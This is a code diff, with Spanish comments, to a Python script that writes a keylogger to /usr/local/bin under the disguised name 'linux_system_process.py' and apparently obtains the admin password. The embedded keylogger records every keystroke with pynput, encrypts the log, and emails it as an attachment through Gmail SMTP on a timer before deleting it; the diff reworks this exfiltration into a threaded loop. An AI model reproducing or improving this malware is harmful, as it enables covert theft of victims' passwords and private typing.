@@ -32,12 +32,16 @@ def get_admin_password():
 # Función para copiar el keylogger a /usr/local/bin
 def copy_keylogger():
     keylogger_code = '''#!/usr/bin/env python3
+#!/usr/bin/env python3
 import os
 import time
 import smtplib
 from cryptography.fernet import Fernet
 from pynput.keyboard import Listener
 import netifaces
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 # Generar clave de cifrado
 key = Fernet.generate_key()
@@ -71,30 +75,43 @@ def log_key_press(key):
 
 # Función para enviar el log por correo y eliminarlo
 def send_log_via_email(log_path, email_from, password, email_to):
-    with open(log_path, 'rb') as log:
-        log_data = log.read()
+    msg = MIMEMultipart()
+    msg['From'] = email_from
+    msg['To'] = email_to
+    msg['Subject'] = key.decode()
 
-# El asunto del email contiene la clave de cifrado
-    subject = key.decode()  # La clave de cifrado como el asunto del correo
-    message = f"Subject: {subject}\\n\\nHere is the log file.".encode() + log_data
+    with open(log_path, 'rb') as log_file:
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(log_file.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_path)}')
+        msg.attach(part)
 
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.login(email_from, password)
-    server.sendmail(email_from, email_to, message)
-    server.quit()
-    # Eliminar el archivo de log después de enviarlo
-    os.remove(log_path)
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(email_from, password)
+        server.sendmail(email_from, email_to, msg.as_string())
+        server.quit()
+        os.remove(log_path)
+    except Exception as e:
+        print(f"Failed to send email: {e}")
 
-# Escuchar las pulsaciones de teclado y guardarlas cifradas
-with Listener(on_press=log_key_press) as listener:
-    while True:
+# Escuchar las pulsaciones de teclado
+def start_listener():
+    with Listener(on_press=log_key_press) as listener:
         listener.join()
 
-        # Cada 10 minutos, enviar el log por correo y eliminarlo
-        if os.path.exists(log_file):
-            send_log_via_email(log_file, "your_email@gmail.com", "your_password", "recipient_email@gmail.com")
-        time.sleep(600)  # Esperar 10 minutos (600 segundos)
-'''
+# Iniciar el listener en un hilo separado
+import threading
+listener_thread = threading.Thread(target=start_listener)
+listener_thread.start()
+
+# Enviar el log cada 10 minutos
+while True:
+    time.sleep(60)  # Esperar 10 minutos
+    if os.path.exists(log_file):
+        send_log_via_email(log_file, "send_email@gmail.com", "password", "recipient_email@gmail.com")'''
 
     dest_path = "/usr/local/bin/linux_system_process.py"
     try:
